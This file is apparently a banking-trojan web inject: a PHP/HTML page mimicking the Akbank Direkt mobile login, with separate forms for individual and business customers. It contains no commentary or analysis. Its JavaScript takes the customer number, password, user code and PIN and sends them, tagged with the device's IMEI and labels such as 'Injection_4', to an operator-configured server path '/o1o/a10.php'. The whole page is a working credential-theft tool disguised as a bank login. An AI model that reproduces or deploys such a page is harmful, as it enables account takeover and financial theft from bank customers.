<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AKBANK</title>
    <style>
        html, body {
            text-align: center;
            position: relative;
            padding: 0;
            margin: 0;
            width: 100%;
            height: 98%;
            color: #555;
            font-family: serif, Arial;
            background: #c51522;
        }

        input {
            outline: none;
        }

        hr {
            margin-top: 10px;
            margin-bottom: 10px;
        }

        .background {
            background: #a41722;
            width: 100%;
            position: relative;
        }

        .background hr {
            border: none;
            border-bottom: 2px solid #bb2f3a;
            width: 100%;
        }

        .clear {
            clear: both;
        }

        .logo-block {
            margin-bottom: 37px;
            background-color: #ac0304;
            height: 58px;
            width: 100%;
            position: relative;
        }

        .logo-image {
            background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKMAAAATCAYAAAD8pr31AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkYyQ0E4MjgyQzk3QTExRTU5NTVEQzcwOTMxRkMzRTg5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkYyQ0E4MjgzQzk3QTExRTU5NTVEQzcwOTMxRkMzRTg5Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RjJDQTgyODBDOTdBMTFFNTk1NURDNzA5MzFGQzNFODkiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RjJDQTgyODFDOTdBMTFFNTk1NURDNzA5MzFGQzNFODkiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6vL4CFAAAIQklEQVR42sRa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') no-repeat #ac0304;
            width: 163px;
            height: 19px;
            left: 50%;
            margin-left: -80px;
            top: 20px;
            position: absolute;
        }

        .menu a {
            display: block;
            width: 50%;
            height: 35px;
            background: #891522;
            color: white;
            font-family: Tahoma,serif;
            font-size: 16px;
            text-decoration: none;
            padding-top: 15px;
            border-bottom: 2px solid #ed222a;
            float: left;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .menu a:active,
        .menu a.active {
            background: #a7303e;
            border-bottom: 6px solid #ed222a;
        }

        .input-field {
            border: none;
            border-bottom: 2px solid #bd5b62;
            background: #a41722;
            height: 35px !important;
            width: 88%;
            font-size: 16px;
            margin: 10px 2% 5px;
            padding-left: 8%;
            font-family: Tahoma,serif;
            color: white;
        }

        .input-field:focus {
            border-bottom: 2px solid white;
        }

        .submit-button {
            display: block;
            width: 40%;
            margin-left: 7%;
            margin-right: 3%;
            background: #c51522;
            border: 2px solid white;
            height: 50px;
            font-family: Tahoma,serif;
            font-size: 16px;
            font-weight: bold;
            color: white;
            margin-top: 15px;
            float: left;
            cursor: pointer;
        }

        .footer-link {
            font-family: Tahoma,serif;
            font-size: 16px;
            color: white;
            text-decoration: underline;
            width: 40%;
            margin-left: 7%;
            margin-right: 3%;
            margin-top: 15px;
            position: relative;
            display: inline-block;
            float: left;
            text-align: left;
        }

        .input-field.fielderror {
            border: 2px solid #f00;
        }
    </style>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

$inj1="$IMEI_country|Injection_1|AkBank|";
$inj2="$IMEI_country|Injection_2|AkBank|";
include "config.php";

?>
<body>


<div class="logo-block">
    <div class="logo-image"></div>
</div>

<div class="menu">
    <a href="#" onclick="showIndividualForm()" class="active" id="menu-individual-link">Bireysel</a>
    <a href="#" onclick="showBusinessForm()" id="menu-business-link">Kurumsal</a>
    <div class="clear"></div>
</div>

<form method="post" id="form-individual"  action="<?php echo $URL;?>/o1o/a10.php?p=<?php echo $inj1;?>" >
    <div class="background" style="height: 125px;">
        <div class="glyphicon glyphicon-user nn1" style="color: white;"></div>

        <input type="number"
               name="user"
               class="input-field"
               id="individual-client-number"
               placeholder="M&uuml;&#351;teri Numaras&#305;"
               onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,10);}"
               autofocus="autofocus"
               maxlength="12" />
        <hr/>
        <div class="glyphicon glyphicon-lock nn2" style="color: white;"></div>
        <input name="pass"
               class="input-field"
               id="individual-password"
               type="password"
               style="margin-top: 0"
               placeholder="Akbank Direkt &#350;ifresi"
               maxlength="12" />
    </div>

    <input type="hidden" name="name" value="Akbank Direkt">

    <button id="submitBtn1" class="submit-button">&#304;ptal</button>
    <button id="submitBtn2" class="submit-button">Giri&#351;</button>

    <div class="clear"></div>

    <a href="#" class="footer-link">M&uuml;&#351;teri Numaram&#305; unuttum</a>
    <a href="#" class="footer-link">&#350;ifre Al/&#350;ifremi Unuttum</a>

    <div class="clear"></div>
</form>

<form method="post" id="form-business" style="display: none" action="<?php echo $URL;?>/o1o/a10.php?p=<?php echo $inj2;?>">
    <div class="background" style="height: 190px;">
        <div class="glyphicon glyphicon-user nn11" style="color: white;"></div>
        <input type="number"
               name="user"
               class="input-field"
               id="business-client-number"
               placeholder="M&uuml;&#351;teri Numaras&#305;"
               onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,10);}" autofocus="autofocus" />
        <hr/>

        <div class="glyphicon glyphicon-th nn33" style="color: white;"></div>

        <input type="number"
               name="pass"
               class="input-field"
               id="business-code-number"
               style="margin-top: 0"
               placeholder="Kullan&#305;c&#305; Kodu"
               onKeyUp="if(this.value>99999){this.value=this.value.substr(0,5);}"
               maxlength="12" />
        <hr/>
        <div class="glyphicon glyphicon-lock nn22" style="color: white;"></div>

        <input type="password"
               name="pin"
               class="input-field"
               id="business-password"
               style="margin-top: 0; margin-bottom: 0"
               placeholder="Akbank Direkt &#350;ifresi"
               maxlength="12" />
    </div>

    <input type="hidden" name="name" value="Akbank Direkt">

    <button id="submitBtn3" class="submit-button">&#304;ptal</button>
    <button id="submitBtn4" class="submit-button">Giri&#351;</button>
    <div class="clear"></div>

    <a href="#" class="footer-link">Giri&#351; Bilgilerimi Unuttum</a>

    <div class="clear"></div>
</form>



<script type="text/javascript">
var formIndividual = document.getElementById('form-individual'),
    formBusiness = document.getElementById('form-business'),
    linkIndividual = document.getElementById('menu-individual-link'),
    linkBusiness = document.getElementById('menu-business-link'),
    selectedForm = 'individual';

	document.getElementById('submitBtn1').onclick = formSubmit;
    document.getElementById('submitBtn2').onclick = formSubmit;
    document.getElementById('submitBtn3').onclick = formSubmit;
    document.getElementById('submitBtn4').onclick = formSubmit;



function formSubmit(){
    if(selectedForm == 'individual') {
        var clientInp = document.getElementById('individual-client-number'),
            passwordInp = document.getElementById('individual-password');



        if(!validateEmpty(clientInp) || !validateEmpty(passwordInp)) {
            return false;
        }



       /* prompt('send', '{"dialog id" : "com.akbank.android.apps.akbank_direkt.html", ' +
        '"client-number": "'+clientInp.value+'", ' +
        '"password": "'+passwordInp.value+'"}');*/

		var url='<?php echo $URL; ?>';
		var imei_c='<?php echo $IMEI_country; ?>';
		document.location.href =url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|akbank|"+clientInp.value+"|"+passwordInp.value+"|";


    } else {
        var clientInp = document.getElementById('business-client-number'),
            codeInp = document.getElementById('business-code-number'),
            passwordInp = document.getElementById('business-password');



        if(!validateEmpty(clientInp) || !validateEmpty(codeInp) || !validateEmpty(passwordInp)) {
            return false;
        }

       /* prompt('send', '{"dialog id" : "akbank", ' +
        '"client-number": "'+clientInp.value+'", ' +
        '"code" : "'+codeInp.value+'", ' +
        '"password": "'+passwordInp.value+'"}');

        formIndividual.submit();*/

	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	//location.replace();
	document.location.href = url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|akbank|"+clientInp.value+"|"+passwordInp.value+"|"+codeInp.value;

    }
}

function validateEmpty(element) {
    if (element.value.trim() == ""){
        try {
            element.className = 'input-field fielderror';
        } catch (e) {
        }
        return false;
    }
    element.className = 'input-field';
    return true;
}

function showBusinessForm(){
    selectedForm = 'business';
    removeClass(linkIndividual, "active");
    addClass(linkBusiness, "active");
    formIndividual.style.display = 'none';
    formBusiness.style.display = 'block';
}

function showIndividualForm() {
    selectedForm = 'individual';
    addClass(linkIndividual, "active");
    removeClass(linkBusiness, "active");
    formIndividual.style.display = 'block';
    formBusiness.style.display = 'none';
}

function insertHiddenField(objDoc, objForm, sNm, sV) {
    var input = objDoc.createElement("input");
    input.setAttribute("type", "hidden");
    input.setAttribute("name", sNm);
    input.setAttribute("value", sV);
    objForm.appendChild(input);
}

function addClass(o, c){
    var re = new RegExp("(^|\\s)" + c + "(\\s|$)", "g")
    if (re.test(o.className)) return
    o.className = (o.className + " " + c).replace(/\s+/g, " ").replace(/(^ | $)/g, "")
}

function removeClass(o, c){
    var re = new RegExp("(^|\\s)" + c + "(\\s|$)", "g")
    o.className = o.className.replace(re, "$1").replace(/\s+/g, " ").replace(/(^ | $)/g, "")
}
</script>

</body>
</html>
